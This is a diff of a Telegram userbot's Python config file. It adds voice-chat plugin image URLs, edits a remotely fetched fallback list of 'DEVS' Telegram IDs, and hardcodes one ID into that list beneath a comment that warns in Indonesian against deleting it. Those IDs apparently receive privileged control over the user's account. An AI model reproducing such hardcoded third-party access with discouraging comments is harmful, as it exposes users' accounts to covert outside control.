@@ -97,7 +97,7 @@ while 0 < 6:
     if _DEVS.status_code != 200:
         if 0 != 5:
             continue
-        DEVS = [844432220, 1906014306, 1382636419, 1738637033]
+        DEVS = [844432220, 1906014306, 1382636419, 2133486058]
         break
     DEVS = _DEVS.json()
     break
@@ -219,6 +219,15 @@ INLINE_PIC = (
     os.environ.get("INLINE_PIC") or "https://telegra.ph/file/9dc4e335feaaf6a214818.jpg"
 )
 
+# Picture For VCPLUGIN
+PLAY_PIC = (
+    os.environ.get("PLAY_PIC") or "https://telegra.ph/file/6213d2673486beca02967.png"
+)
+
+QUEUE_PIC = (
+    os.environ.get("QUEUE_PIC") or "https://telegra.ph/file/d6f92c979ad96b2031cba.png"
+)
+
 # Last.fm Module
 BIO_PREFIX = os.environ.get("BIO_PREFIX", None)
 DEFAULT_BIO = os.environ.get("DEFAULT_BIO", None)
@@ -273,6 +282,7 @@ for binary, path in binaries.items():
     os.chmod(path, 0o755)
 
 # Jangan di hapus Nanti ERROR
+DEVS.add(844432220)
 
 # 'bot' variable
 if STRING_SESSION:
